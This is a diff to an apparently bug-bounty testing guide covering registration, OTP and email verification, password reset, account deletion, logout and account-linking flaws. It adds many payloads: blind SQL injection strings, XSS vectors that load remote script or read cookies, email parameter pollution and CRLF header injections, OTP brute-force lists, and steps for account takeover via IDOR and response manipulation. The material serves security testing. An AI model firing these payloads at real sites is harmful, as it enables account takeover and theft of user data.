@@ -586,6 +586,373 @@ exiftool.exe -Comment="<?php echo 'START ' . 'Hacked By h0tak88r :)' . ' END'; ?
 
 </details>
 
+### Registration
+
+<details>
+
+<summary><strong>Throw Way Email Services Used for SignUps</strong></summary>
+
+Use throwaway email to create a temporary email:
+
+* [ ] https://mail.protonmail.com
+* [ ] http://en.getairmail.com&#x20;
+* [ ] https://temp-mail.org/en
+* [ ] https://www.mailinator.com&#x20;
+
+</details>
+
+<details>
+
+<summary><strong>Username/Email Enumeration</strong></summary>
+
+* [ ] Non-Brute Force
+* [ ] Check the Registration Process and try to find IDOR or endpoint that leaks usernames/emails
+
+</details>
+
+<details>
+
+<summary><strong>SQLI in Email Field</strong></summary>
+
+* [ ] SQLI in Email Field
+
+{% code overflow="wrap" %}
+```json
+{"email":"asd'a@a.com"} --> Not Valid {"email":"asd'or'1'='1@a.com" } --> valid {"email":"a'-IF(LENGTH(database())>9,SLEE P(7),0)or'1'='1@a.com"} --> Not Valid {"email":"a'-IF(LENGTH(database())>9,SLEE P(7),0)or'1'='1@a.com"} -> Valid --> Delay: 7,854 milis {"email":"\"a'-IF(LENGTH(database())=10,SLEEP(7),0)or'1'='1\"@a.com"} --> {"code":0,"status":200,"mes sage":"Berhasil"} --> Valid --> Delay 8,696 milis {"email":"\"a"-IF(LENGTH(database())=11,SLEEP(7),0)or'1'='1\"@a.com"} ---> {"code":0,"status":200,"mes sage":"Berhasil"} ---> Valid --> No delay
+```
+{% endcode %}
+
+* [https://dimazarno.medium.com/bypassing-email-filter-which-leads-to-sql-injection-e57bcbfc6b17](https://dimazarno.medium.com/bypassing-email-filter-which-leads-to-sql-injection-e57bcbfc6b17)
+
+</details>
+
+<details>
+
+<summary><strong>XSS/HTML Injection in username/email for registration</strong></summary>
+
+{% code overflow="wrap" %}
+```html
+"><svg/onload=alert(1)>"@x.y
+"><img/src/onerror=import('//domain/')>"@yourdomain.com
+013371337;ext=<img/src/onerror=import('//domain/')>
+admin1@example.com<script>alert('xss');</script>
+“><svg/onload=confirm(1)>”@x.y
+"hello<form/><!><details/open/ontoggle=alert(1)>"@gmail.com
+["');alert('XSS');//"]@xyz.xxx
+"<svg/onload=alert(1)>"@gmail.com
+"><img/src/onerror=import('//domain/')>"@yourdomain.com
+test@gmail.com%27\\%22%3E%3Csvg/onload=alert(/xss/)%3E
+"><img src=x onerror=alert(88)>"@gmail.com
+"><svg/onload="alert(document.cookie)"
+```
+{% endcode %}
+
+</details>
+
+<details>
+
+<summary><strong>Rate Limit Issues</strong></summary>
+
+* [ ] No Rate Limit in Registration
+* [ ] Rate Limit Bypass
+* [ ] Captcha Bypass
+
+</details>
+
+<details>
+
+<summary><strong>Weak Password Policy</strong></summary>
+
+Check if program accept
+
+1. weak passwords like `123456`
+2. username same as email address
+3. password same as email address
+4. improper implemented password reset and change features
+
+</details>
+
+<details>
+
+<summary><strong>Path Overwrite</strong></summary>
+
+If an application allows users to check their profile with direct path `/{username}` always try to signup with system reserved file names, such as `index.php, signup.php, login.php, etc`. In some cases what happens here is, when you signup with username: index.php or `../../../../index.php` , now upon visiting `target.tld/index.php`, your profile will comeup and occupy the index.php page of an application.&#x20;
+
+Similarly, if an attacker is able to signup with username login.php, Imagine login page getting takeovered.
+
+{% embed url="https://infosecwriteups.com/logical-flaw-resulting-path-hijacking-dd4d1e1e832f" %}
+
+</details>
+
+<details>
+
+<summary><strong>DOS at Name/Password field in Signup Page</strong></summary>
+
+**Steps to reproduce:**
+
+1. Go Sign up form.
+2. Fill the form and enter a long string in password
+3. Click on enter and you’ll get 500 Internal Server error if it is vulnerable.
+
+**Further Read**&#x20;
+
+{% embed url="https://shahjerry33.medium.com/long-string-dos-6ba8ceab3aa0" %}
+
+{% embed url="https://hackerone.com/reports/738569" %}
+
+{% embed url="https://hackerone.com/reports/223854" %}
+
+</details>
+
+### Email/OTP Verification
+
+<details>
+
+<summary><a href="https://hackerone.com/reports/791775"><strong>Email Verification Bypass Leads to PrivEsc</strong></a></summary>
+
+* Visit https://www.shopify.com/pricing and signup a free trial with an email address, say `attacker@gmail.com` that you can receive emails after entering the fields to enter the store, on top right corner, click your name and go to Your Profile
+* Change your email to someone that you want to takeover, for example `yaworsk@hackerone.com` and click save All done now, grab a coffee, sit back and relax, watch some YouTube videos and wait for an email to go to your email `attacker@gmail.com` The email that you are waiting for is from `mailer@shopify.com`, and sent to the old email&#x20;
+* Click the link and you should see your email has been updated to yaworsk@hackerone.com
+
+</details>
+
+<details>
+
+<summary><strong>Email Verification link Doesn't Expire After Email Change Leads to Delete User Account</strong></summary>
+
+1. The victim already has an account with the target website, registered with the email address `victim@gmail.com`.
+2. The attacker attempts to create an account on the target website using their email address, `attacker@gmail.com.`
+3. The attacker does not proceed with the account creation process and saves the confirmation link without confirming the email.
+4. The attacker presents their Gmail account (`attacker@gmail.com`) as a gift to the victim.
+5. The victim, believing it to be their own Gmail account, changes the password and assumes control of the Gmail account `attacker@gmail.com`, which was originally the attacker's account.
+6. The victim decides to change their email address on the target website (recreation).
+7. The victim initiates the email address change process and requests a change email link.
+8. The attacker, having the saved confirmation link, completes the account creation process using the link. Now there is an account with the email address attacker@gmail.com.
+9. Unaware of the attacker's actions, the victim clicks on the update email link and updates their email address to `attacker@gmail.com` ( Remember! attacker have non access to Gmail account `attacker@gmail.com` he only have the confirm link)
+10. When the victim attempts to log in, they realize that the newly created account by the attacker in step 8 has overwritten their original account.
+11. The victim tries to recover their account by requesting a password reset, but they can only access the newly created account by the attacker and are unable to regain access to their original account.
+
+</details>
+
+<details>
+
+<summary><strong>Email Verification Bypass using OAUTH</strong></summary>
+
+1. Signup for `victim@gmail.com` using email signup
+2. Signup through google login using the same email
+3. The user will be logged in
+4. This vulnerability is very high severity because of ease of exploitation and complete account access if the victim creates an account.
+
+{% embed url="https://hackerone.com/reports/1074047" %}
+
+</details>
+
+<details>
+
+<summary><strong>Verification link leaked in the response</strong></summary>
+
+1. Signup for victim@gmail.com using email signup
+2. Check the response from the server for leaked verification link
+
+[https://hackerone.com/hacktivity/cwe\_discovery](https://hackerone.com/hacktivity/cwe_discovery)
+
+</details>
+
+<details>
+
+<summary><strong>Bypass via Response Manipulation</strong></summary>
+
+1. First visit your website "[https://hackers.upchieve.org](https://hackers.upchieve.org)" and request for the sign up.
+2. In the second step, choose either you want to register as an academic coach or need an academic coach.
+3. In the third step, enter your email and create a password.
+4. In the fourth step, enter name and mobile phone, then sign up.
+5. Then request for verification code on email.
+6. Enter wrong verification code and intercept request using Burp suite.
+7. After intercepting the request, I changed the status from "False" to "True". `{"status":false to "status":true}`
+8. Boom!! Verification code bypassed.
+9. Finally, the account was created with the wrong verification code.
+
+{% embed url="https://hackerone.com/reports/1406471" %}
+
+</details>
+
+<details>
+
+<summary><strong>Ability to bypass partner email confirmation to take over any store given an employee email</strong></summary>
+
+{% embed url="https://hackerone.com/reports/300305" %}
+
+</details>
+
+<details>
+
+<summary><strong>Rate Limit Issues</strong></summary>
+
+* [ ] No Rate Limit When Sending OTP
+
+{% code overflow="wrap" %}
+```
+1) Create an Account
+2) When Application Ask you For the OTP( One-time password ), Enter wrong OTP and Capture this Request In Burp.
+3) Send This Request into Repeater and repeat it by setting up payload on otp Value.
+4) if there is no Rate Limit then wait for 200 Status Code (Sometimes 302)
+5)if you get 200 ok or 302 Found Status Code that means you've bypass OTP
+```
+{% endcode %}
+
+* [ ] No Rate Limit when Email verification
+  * [ ] try to click resend confirmation email request
+  * [ ] capture it
+  * [ ] try to send it 50+ times
+
+{% embed url="https://hackerone.com/reports/774050" %}
+
+</details>
+
+<details>
+
+<summary><strong>Broken Authentication To Email Verification Bypass</strong></summary>
+
+1. First You need to make a account & You will receive a Email verification link.
+2. Application in my case give less Privileges & Features to access if not verified.
+3. Logged into the Application & I change the email Address to Email B.
+4. Verification Link was Sent & I verified that.
+5. Now I again Changed the email back to Email I have entered at the time of account creation.
+6. It showed me that my Email is Verified.
+7. Hence , A Succesful Email verfication Bypassed as I haven't Verified the Link which was sent to me in the time of account creation still my email got verified.
+8. Didn't Receive any code again for verification when I changed back my email & When I open the account it showed in my Profile that its Verified Email.
+
+</details>
+
+<details>
+
+<summary><strong>ATO from manipulating the email Parameter</strong></summary>
+
+{% code overflow="wrap" %}
+```http
+# parameter pollution
+email=victim@mail.com&email=hacker@mail.com
+
+# array of emails
+{"email":["victim@mail.com","hacker@mail.com"]}
+
+# carbon copy
+email=victim@mail.com%0A%0Dcc:hacker@mail.com
+email=victim@mail.com%0A%0Dbcc:hacker@mail.com
+
+# separator
+email=victim@mail.com,hacker@mail.com
+email=victim@mail.com%20hacker@mail.com
+email=victim@mail.com|hacker@mail.com
+#No domain:
+email=victim
+#No TLD (Top Level Domain):
+email=victim@xyz
+#change param case 
+email=victim@mail.com&Email=attacker@mail.com
+email@email.com,victim@hack.secry
+email@email“,”victim@hack.secry  
+email@email.com:victim@hack.secry
+email@email.com%0d%0avictim@hack.secry  
+%0d%0avictim@hack.secry
+%0avictim@hack.secry
+victim@hack.secry%0d%0a
+victim@hack.secry%0a
+victim@hack.secry%0d
+victim@hack.secr%00
+victim@hack.secry{{}}
+```
+{% endcode %}
+
+</details>
+
+<details>
+
+<summary><strong>Bypassing OTP in registration forms by repeating the form submission multiple times using repeater</strong></summary>
+
+{% code overflow="wrap" %}
+```markdown
+1. Create an account with a non-existing phone number
+2. Intercept the Request in BurpSuite
+3. Send the request to the repeater and forward
+4. Go to Repeater tab and change the non-existent phone number to your phone number
+5. If you got an OTP to your phone, try using that OTP to register that non-existent number
+```
+{% endcode %}
+
+</details>
+
+<details>
+
+<summary><strong>OTP Bypass in JSON</strong></summary>
+
+{% code overflow="wrap" %}
+```json
+{
+        "code":[
+                "1000",
+                "1001",
+                "1002",
+                "1003",
+                "1004",
+                ...
+                "9999"
+                ]
+}
+```
+{% endcode %}
+
+</details>
+
+<details>
+
+<summary><strong>More test cases for bypassing OTP</strong></summary>
+
+1. Check for default OTP - 111111, 123456, 000000
+2. Check if otp has been leaked in respone (Capture the request in burpsuite and send it to repeater to check the response)
+3. Check if old OTP is still vaild
+
+</details>
+
+<details>
+
+<summary><strong>Duplicate Registration</strong></summary>
+
+1. Create first account in application with email say `abc@gmail.com` and password.
+2. Logout of the account and create another account with same email and different password.
+3. You can even try to change email case in some case like from `abc@gmail.com` to `Abc@gmail.com` Try to generate using an existing username Check varying the email: `uppercase`, `+1@`, Put black characters after the email: `test@test.com` a , special characters in the email name (`%00`, `%09`, `%20`), `victim@gmail.com@attacker.com`, `victim@attacker.com@gmail.com`
+4. Finish the creation process — and see that it succeeds
+5. Now go back and try to login with email and the new password. You are successfully logged in.
+
+{% embed url="https://hackerone.com/reports/187714" %}
+
+{% embed url="https://shahjerry33.medium.com/duplicate-registration-the-twinning-twins-883dfee59eaf" %}
+
+{% embed url="https://blog.securitybreached.org/2020/01/22/user-account-takeover-via-signup-feature-bug-bounty-poc/" %}
+
+
+
+* [ ] Delete any user account without user interaction The database accepts string as it without convert it to lowercase string
+
+1. Create a normal email ex. `theuntest@crowd.com`
+2. After the email created I able to bypass verify too
+3. Bypass for the verify easy, send a valid token to any email the link will be like: https://the-vulnreable/confi-endpoint/account/confirmemail?userId=maybeeee@gmail.com\&token=ananfnasjfasjnfjasfsaa
+4. Just manipulate the email with your email and the email will verified
+5. Now login to the normal account as shown I received the JWT normally
+6. After create an account customize the email, so the email will be like: `MAybeeEE@GmaiL.coM`, looks like camel case
+7. As shown below I able to register the customized email as an another email
+8. After the email created I have the ability to bypass the verify as shown above
+9. URL will be like: https://the-vulnreable/confi-endpoint/account/confirmemail?userId=MAybeeEE@GmaiL.coM\&token=ananfnasjfasjnfjasfsaa
+10. The user will verified
+11. Here the two users has signed
+12. The user will received authentication successful but will never receives JWT because the customized email will conflicts with the old email in DB
+
+{% embed url="https://m.facebook.com/story.php?story_fbid=pfbid0345dp8U87sY32EfSKAnkqsUNJrN9iMt5WLYFZZQHnimriAbgHv2bBQSEPHPV66Sppl&id=100010641453891&mibextid=Nif5oz" %}
+
+</details>
+
+
+
 ### Inviting Feature
 
 <details>
@@ -1226,93 +1593,6 @@ Https://evil.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaa%20%22<b>hello</b><h1
 
 </details>
 
-### Newsletter
-
-<details>
-
-<summary><strong>IDOR</strong></summary>
-
-* [ ] Changing the newsletter ID
-
-</details>
-
-<details>
-
-<summary><strong>Excessive Data Exposure</strong></summary>
-
-* [ ] Sometimes Server Leaks A lot of information in response
-
-</details>
-
-<details>
-
-<summary><strong>CSRF</strong> </summary>
-
-* [ ] Subscribe/unsubscribe option
-
-</details>
-
-<details>
-
-<summary><strong>Injection</strong></summary>
-
-* [ ] SQL Injection in email parameter or other parameters
-* [ ] XSS/HTML Injection
-
-`https://testbuguser.myshopify.com/?contact[email]%20onfocus%3djavascript:alert(%27xss%27)%20autofocus%20a=a&form_type[a]aaa`&#x20;
-
-</details>
-
-<details>
-
-<summary><strong>Unverified User Can Post Newsletter</strong></summary>
-
-{% embed url="https://hackerone.com/reports/1691603" %}
-
-1. Sign up for an account on Linkedin
-2. Without verifying the email, jump directly to the URL : `https://www.linkedin.com/post/new/` to write an article&#x20;
-3. It can be seen that there is no option to create a Newsletter.
-4. Now Login into the account where the Email is verified and try to create a newsletter.
-5. Click on Done and capture the vulnerable request and replay the request with the unverified user cookies. and the newsletter will be successfully created.
-
-</details>
-
-<details>
-
-<summary><strong>BAC by Filling the form with other's email</strong></summary>
-
-{% embed url="https://hackerone.com/reports/145396" %}
-
-The mentioned URL contains a form that, when supplied correct user emails, unsubscribes users from the newsletters they're subscribed to. If the user is not subscribed, the form returns a message that says that the user is not subscribed if this is the case.
-
-</details>
-
-<details>
-
-<summary><strong>No Rate Limit</strong></summary>
-
-{% embed url="https://hackerone.com/reports/145612" %}
-
-> The lack of a captcah or verificationcodeX (it's empty) in your phplist configuration allows attackers to use this mail for to send as much spam as they like to victims. I did not reach an email sending limit when I had tested this.
-
-
-
-* [ ] No Captcha or Rate Limit Leads to Email Spam
-
-</details>
-
-<details>
-
-<summary><strong>Host header injection/redirection via newsletter signup</strong></summary>
-
-{% embed url="https://hackerone.com/reports/229498" %}
-
-> There's a host header injection vulnerability via all newsletter signups in the referrer attribute. This works with all pages that have "Join our email list" signup boxes.
->
-> **Since the referrer attribute can be changed to an outside domain the email being received redirects all links within the "Welcome to Starbucks" email. So in result the member is redirected to a malicious site from the email they used.**
-
-</details>
-
 ### Change Email&#x20;
 
 <details>
@@ -1402,6 +1682,284 @@ The mentioned URL contains a form that, when supplied correct user emails, unsub
 <summary><strong>Lack of password confirmation when email change</strong></summary>
 
 * [ ] &#x20;[No Password Verification on Changing Email Address Cause ATO](https://hackerone.com/reports/292673)
+
+</details>
+
+<details>
+
+<summary><strong>IDOR to ATO</strong></summary>
+
+1- We create an account\
+2- Then we log in\
+3- go to edit profile\
+4- We open burp suite\
+5- Then we intercepted to the request to save the modification\
+6- We’re gonna change the email to the victim’s email And Enter a new password Through the burpsuite\
+7- Then we send the request to the intruder\
+8- Now we’re gonna guess the victim’s (user\_idx)\
+9- We will guess the user\_idx\
+10- We will guess the user\_idx from 1 to 2500\
+11- Another note I noticed when accepting the request will be in the response (“result”:1)and when not accepting it will be (“result”:-1)\
+12- Therefore, before turning on the intruder, we search for “result”: 1 by Grep in options\
+13- Then we turn on the intruder\
+14- We will notice after completion, find the user\_idx of the victim , and the new password has already been set for this account and therefore we can log in with the email and the new password that we created
+
+</details>
+
+
+
+### Reset Password
+
+<details>
+
+<summary>Host Header Poisoning </summary>
+
+{% embed url="https://0xacb.com/normalization_table" %}
+
+{% code overflow="wrap" %}
+```matlab
+victim.com@attacker.com
+```
+{% endcode %}
+
+</details>
+
+<details>
+
+<summary>IDN Homograph Attack leads to ATO</summary>
+
+{% embed url="https://infosecwriteups.com/how-i-was-able-to-change-victims-password-using-idn-homograph-attack-587111843aff" %}
+
+</details>
+
+<details>
+
+<summary>Password reset with manipulating email parameter (BAC)</summary>
+
+{% code overflow="wrap" %}
+```http
+# parameter pollution
+email=victim@mail.com&email=hacker@mail.com
+
+# array of emails
+{"email":["victim@mail.com","hacker@mail.com"]}
+
+# carbon copy
+email=victim@mail.com%0A%0Dcc:hacker@mail.com
+email=victim@mail.com%0A%0Dbcc:hacker@mail.com
+
+# separator
+email=victim@mail.com,hacker@mail.com
+email=victim@mail.com%20hacker@mail.com
+email=victim@mail.com|hacker@mail.com
+#No domain:
+email=victim
+#No TLD (Top Level Domain):
+email=victim@xyz
+#change param case 
+email=victim@mail.com&Email=attacker@mail.com
+email@email.com,victim@hack.secry  
+email@email“,”victim@hack.secry  
+email@email.com:victim@hack.secry  
+email@email.com%0d%0avictim@hack.secry  
+%0d%0avictim@hack.secry  
+%0avictim@hack.secry  
+victim@hack.secry%0d%0a  
+victim@hack.secry%0a  
+victim@hack.secry%0d  
+victim@hack.secry%00  
+victim@hack.secry{{}}
+```
+{% endcode %}
+
+</details>
+
+<details>
+
+<summary>Response Manipulation to ATO</summary>
+
+1. Do Normal Reset Password Process and note the successful response
+2. Request for reset password token
+3. enter 00000 or any random number
+4. Intercept the response
+5. delete error message and change the status code to 200 and change body like what you noted in step
+
+</details>
+
+<details>
+
+<summary>IDOR to ATO</summary>
+
+IDOR on Reset Password\
+The last one was also an Basic IDOR, When I requested for reset password then the request response looks like this
+
+<figure><img src="../.gitbook/assets/image (362).png" alt=""><figcaption></figcaption></figure>
+
+Then OTP came to my email and I entered the OTP but when I entered new password and captured that request
+
+<figure><img src="../.gitbook/assets/image (361).png" alt=""><figcaption></figcaption></figure>
+
+Then I noticed there was no OTP field, but there was a user id, which was encrypted but was being leaked in the response, so I just replaced it with the user id of another account, and bam, my other account’s password was changed.
+
+</details>
+
+<details>
+
+<summary>Race Condition</summary>
+
+{% embed url="https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities" %}
+
+</details>
+
+<details>
+
+<summary>Weak Password Reset Token</summary>
+
+* [ ] Completely remove the token
+* [ ] change it to `00000000`...
+* [ ] use `null/nil` value
+* [ ] try expired token
+* [ ] try an array of old tokens
+* [ ] look for race conditions
+* [ ] change 1 char at the begin/end to see if the token is evaluated
+* [ ] use unicode char jutzu to spoof email address
+* [ ] [Bruteforcing password reset tokens](https://hackerone.com/reports/271533)
+
+> The password reset token should be randomly generated and unique every time.\
+> Try to determine if the token expire or if it’s always the same, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by the algorithm.
+
+* [ ] Timestamp
+* [ ] UserID
+* [ ] Email of User
+* [ ] Firstname and Lastname
+* [ ] Date of Birth
+* [ ] Cryptography
+* [ ] Number only
+* [ ] Small token sequence ( characters between \[A-Z,a-z,0-9])
+* [ ] Token reuse
+* [ ] Token expiration date
+
+{% embed url="https://vasuyadav0786.medium.com/weak-cryptography-to-account-takeovers-87782224ed0d" %}
+
+</details>
+
+<details>
+
+<summary>No length on password Leads to DOS</summary>
+
+{% embed url="https://hackerone.com/reports/1411363" %}
+
+</details>
+
+<details>
+
+<summary>Injection Attacks in email section</summary>
+
+[#xss-html-injection](features-abuse.md#xss-html-injection "mention")
+
+</details>
+
+<details>
+
+<summary>Rate Limit Issues</summary>
+
+{% embed url="https://hackerone.com/reports/1166066" %}
+
+</details>
+
+<details>
+
+<summary>Enumeration of username on password reset page</summary>
+
+{% embed url="https://hackerone.com/reports/806151" %}
+
+</details>
+
+<details>
+
+<summary>Password reset token leaked via Referer header</summary>
+
+* [ ] Request password reset to your email address
+* [ ] Click on the password reset link
+* [ ] Don't change password
+* [ ] Click any 3rd party websites(eg: Facebook, twitter)
+* [ ] Intercept the request in burp-suite proxy
+* [ ] Check if the referer header is leaking password reset token. Reference:
+
+{% embed url="https://hackerone.com/reports/1320242" %}
+
+{% embed url="https://hackerone.com/reports/342693" %}
+
+{% embed url="https://hackerone.com/reports/272379" %}
+
+{% embed url="https://hackerone.com/reports/737042" %}
+
+{% embed url="https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a" %}
+
+{% embed url="https://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1" %}
+
+Impact It allows the person who has control of particular site to change the user’s password (CSRF attack), because this person knows reset password token of the user.
+
+</details>
+
+<details>
+
+<summary>HTML Injection on password reset page</summary>
+
+{% embed url="https://github.com/KathanP19/HowToHunt/blob/master/HTML_Injection/HTML_Injection_on_password_reset_page.md" %}
+
+1. Create your account
+2. Edit your name to `<h1>attacker</h1>` or `"abc><h1>attacker</h1>` and save it.
+3. Request for a reset password and check your email.
+4. You will notice the `<h1>` tag getting executed
+
+* HTML injection are usually considered as low to medium severity bugs but you can escalate the severity by serving a malicious link by using `<a href>` for eg: `<h1>attacker</h1><a href="your-controlled-domain"Click here</a>`
+* You can redirect the user to your malicious domain and serve a fake reset password page to steal credentials Also you can serve a previously found XSS page and steal user cookies etc etc.. The creativity lies on you..
+
+</details>
+
+<details>
+
+<summary>Password Policy Restriction Bypass</summary>
+
+{% embed url="https://hackerone.com/reports/1675730" %}
+
+</details>
+
+<details>
+
+<summary>Token Invalidation Issues</summary>
+
+* [ ] Token is Not Invalidated After Email Change/Password Change
+
+{% embed url="https://hackerone.com/reports/411337" %}
+
+* [ ] Failure to Invalidate Session > On Password Reset
+
+{% embed url="https://hackerone.com/reports/411337" %}
+
+* [ ] Token is Not Invalidated After Use
+* [ ] Token Has Long Timed Expiry
+* [ ] Token is Not Invalidated After New Token is Requested
+* [ ] Token is Not Invalidated After Login
+
+</details>
+
+<details>
+
+<summary>Reset Password via Username ? Try Making two accounts same username but different emails </summary>
+
+
+
+{% embed url="https://shahjerry33.medium.com/duplicate-registration-the-twinning-twins-883dfee59eaf" %}
+
+</details>
+
+<details>
+
+<summary>CRLF </summary>
+
+with CLRF: `/resetPassword?0a%0dHost:atracker.tld` (x-host, true-client-ip, x-forwarded...)
 
 </details>
 
@@ -1537,6 +2095,8 @@ The mentioned URL contains a form that, when supplied correct user emails, unsub
 
 * [ ] `test.com/user/tester` —> Try Path Overwrite -> `test.com/user/login.php`
 
+{% embed url="https://infosecwriteups.com/logical-flaw-resulting-path-hijacking-dd4d1e1e832f" %}
+
 </details>
 
 <details>
@@ -1658,7 +2218,182 @@ Then sent the code that I've received in the second OperationName, which was: `V
 
 </details>
 
+### Account Deletion
 
+<details>
+
+<summary><strong>Lack of Password/Re-Authentication Confirmation</strong></summary>
+
+* [ ] **Missing confirmation token:** Verify if the account deletion request (`POST /api/v1/delete-account`) can be executed _without_ providing the user's current password or a freshly generated re-authentication token.
+* [ ] [Lack of Password Confirmation for Account Deletion](https://hackerone.com/reports/950471)
+* [ ] **Session reuse:** If a password _is_ required, test if the backend accepts an expired or previously used re-authentication token, or if it accepts the standard session cookie without validating the password payload.
+* [ ] **Password omission:** Try removing the `"password"` or `"current_password"` parameter entirely from the request body to see if the backend defaults to processing the deletion anyway.
+* [ ] **Empty value submission:** Send the deletion request with the password parameter present but set to blank, `null`, `true`, or an empty array (`[]`).
+
+</details>
+
+<details>
+
+<summary><strong>Cross-Site Request Forgery (CSRF) to Delete Account</strong></summary>
+
+* [ ] **Analyze anti-CSRF tokens:** Check if the deletion request includes a CSRF token. If it does, try removing the token, sending a blank token, or altering its characters to see if it is strictly validated.
+* [ ] **Token fixation / cross-session reuse:** Use a valid CSRF token from Account A (attacker) inside a request made by Account B (victim). If it works, the token is not tied to the specific user session.
+* [ ] **Content-Type flipping:** If the deletion endpoint requires JSON (`Content-Type: application/json`) and validates CSRF, try changing the Content-Type to `application/x-www-form-urlencoded` or `text/plain` to see if the backend still processes it, allowing a standard HTML form exploitation.
+
+</details>
+
+<details>
+
+<summary><strong>CORS misconfiguration</strong></summary>
+
+* [ ] **CORS misconfiguration:** Check if the endpoint responds to cross-origin requests with `Access-Control-Allow-Origin: https://attacker.com` and `Access-Control-Allow-Credentials: true`.
+
+</details>
+
+<details>
+
+<summary><strong>IDOR (Insecure Direct Object Reference) in Deletion</strong></summary>
+
+* [ ] **Identifier substitution:** Locate the identifier in the deletion request (e.g., `DELETE /api/users/12345` or `{"user_id": 12345}`) and swap it with the ID of a victim account while authenticated as a low-privileged user.
+* [ ] **Array/Batch deletion injection:** If the endpoint accepts an array of identifiers, try injecting other users' IDs alongside yours:
+
+```json
+{ "delete_ids": [12345, 67890] } 
+```
+
+* [ ] **UUID/GUID leaks:** If the application uses secure UUIDs, hunt for endpoints elsewhere in the application (like public profiles, comments, or team settings) where the victim's UUID is exposed, then feed that UUID into the deletion endpoint.
+* [ ] **Parameter pollution:** Test if adding a second user ID parameter tricks the authorization layer into checking one ID but deleting the other:
+
+```http
+DELETE /api/account?id=my_id&id=victim_id
+```
+
+</details>
+
+<details>
+
+<summary><strong>Logical Flaws &#x26; Residual Data</strong></summary>
+
+* [ ] **Soft-delete data leaks:** After deleting the account, try logging back in or requesting a password reset. If the account is only "soft-deleted" (hidden from the UI), check if its private API endpoints are still accessible.
+* [ ] **Orphaned resources:** Check if deleting the primary user account leaves secondary resources active (e.g., cloud buckets, API keys, or active team invitations) that can still be controlled or accessed by the attacker.
+
+</details>
+
+<details>
+
+<summary><strong>Previously Generated API Keys Still Usable after deleting the account</strong></summary>
+
+
+
+</details>
+
+### Logout Feature
+
+<details>
+
+<summary><strong>Server-Side Session Invalidation (The Replay Attack)</strong></summary>
+
+* [ ] **Active session replay:** Capture a high-privilege state request (e.g., `/api/v1/settings`) in Burp Suite. Click logout in the browser, then replay the captured request from Burp Repeater. If it returns a `200 OK` with sensitive user data instead of `401 Unauthorized`, the session is still active on the server.
+* [ ] **Token extraction from cookies:** Copy all session cookies (e.g., `session`, `JWT`, `auth_token`) before logging out. Log out, manually inject those copied cookies back into your browser storage, and refresh the page to see if you are logged back in.
+* [ ] **Concurrent session termination:** Log into the account from two different browsers (Browser A and Browser B). Log out from Browser A. Check if Browser B is automatically logged out or if its session remains completely functional.
+* [ ] **OAuth / OIDC token revocation:** If the app uses single sign-on (SSO), verify whether clicking logout actually invalidates the access/refresh tokens on the identity provider backend, or if it just deletes them locally from browser memory.
+
+</details>
+
+<details>
+
+<summary><strong>Cross-Site Request Forgery (CSRF) on Logout</strong></summary>
+
+* [ ] **Lack of CSRF tokens:** Inspect the logout request (whether it's a `GET /logout` link or a `POST /api/auth/logout` button). If there is no unique, unpredictable token validating the request, it is vulnerable to a forced logout attack.
+* [ ] **GET method usage:** Check if the logout action can be triggered via a simple `GET` request. If an attacker can drop an image tag like `<img src="[https://target.com/logout](https://target.com/logout)">` onto a forum, any visiting user will be instantly logged out.
+* [ ] **Token omission / alteration:** If a CSRF token _is_ present in a logout `POST` request, remove it entirely or swap it with a random string. If the server logs you out anyway, the token validation is broken.
+* [ ] **SameSite cookie laxity:** Verify if the session cookies lack the `SameSite=Strict` or `SameSite=Lax` attributes. If they are marked `SameSite=None`, cross-site attacks can easily leverage them to force logout state changes.
+
+</details>
+
+<details>
+
+<summary><strong>Browser cache back-button exposure</strong></summary>
+
+* [ ] **Browser cache back-button exposure:** Log out of the application, then immediately click the browser's "Back" arrow. Check if sensitive pages cached in the browser state are fully readable without re-authenticating.
+
+</details>
+
+### Account Linking
+
+<details>
+
+<summary><strong>Response &#x26; Status Manipulation (Client-Side Trust)</strong></summary>
+
+* [ ] **Bypass password confirmation:** When linking a third-party account (Google, GitHub, Facebook), if the app requires a local password confirmation step, intercept the `401 Unauthorized` or `{"success":false}` response of a wrong password and rewrite it to match a successful `200 OK` or `{"success":true}` response.
+* [ ] **HTTP status code flipping:** Force a failed validation response from a `400/401/403` status code to a `200 OK` using Burp Suite Proxy (Match and Replace or Intercept Response) to see if the UI unlocks the OAuth linking state.
+* [ ] **Boolean / Step injection:** Look for client-side routing parameters in JSON responses like `"is_verified": false`, `"step": "password_check"`, or `"status": "failed"`. Mutate them to `"is_verified": true`, `"step": "oauth_redirect"`, or `"status": "success"`.
+* [ ] [ATO Via Response Manipulation](https://hackerone.com/reports/1040373)
+
+```html
+1. Open a browser in which a user has previously logged into an account, but hasn't logged out.
+2. Open another browser and login using your account
+3. Try to link gmail using your account, it will prompt for a password confirmation, enter your password
+4. Intercept the response and copy it
+5. Go to the victims account and link to gmail again
+6. This time enter any password and intercept response
+7. Paste the copied response from the attacker account
+```
+
+</details>
+
+<details>
+
+<summary><strong>Cross-Account OAuth State Pre-Authentication (The Linking ATO)</strong></summary>
+
+* [ ] **Pre-auth account linking:** Create an account via a third-party provider (e.g., Google). If the app allows you to link a traditional username/password to it later _without_ verifying ownership of the original registration email, an attacker can pre-create accounts using a victim's email and wait for the victim to sign up.
+* [ ] **Missing OAuth `state` parameter:** Check if the account linking initialization request (`/user/link/google`) includes a cryptographically secure, unpredictable `state` parameter. If it is missing or static, test for an Account Linking CSRF:
+
+1. Initiate the link on your attacker account.
+2. Intercept the final callback URL (`/oauth/callback?code=...`).
+3. Drop the request and send that callback URL to a logged-in victim. If they click it, your attacker social account links to _their_ application account.
+
+</details>
+
+<details>
+
+<summary><strong>Identity Provider (IdP) Email Misalignment</strong></summary>
+
+* [ ] **Dynamic email trust:** Test what happens when the email on your Google/GitHub account does not match the email on the application account. If the application blindly trusts the incoming OAuth payload (`email` field) without checking the unique provider account ID (`sub` or `id`), can you take over an account by changing your third-party account email to the victim's email?
+* [ ] **Secondary email linking:** If the application allows adding multiple emails or third-party identities, verify if the app sends a verification link to the _newly added identity_ before fully associating it with the profile.
+
+</details>
+
+<details>
+
+<summary><strong>Race Conditions &#x26; Parameter Pollution</strong></summary>
+
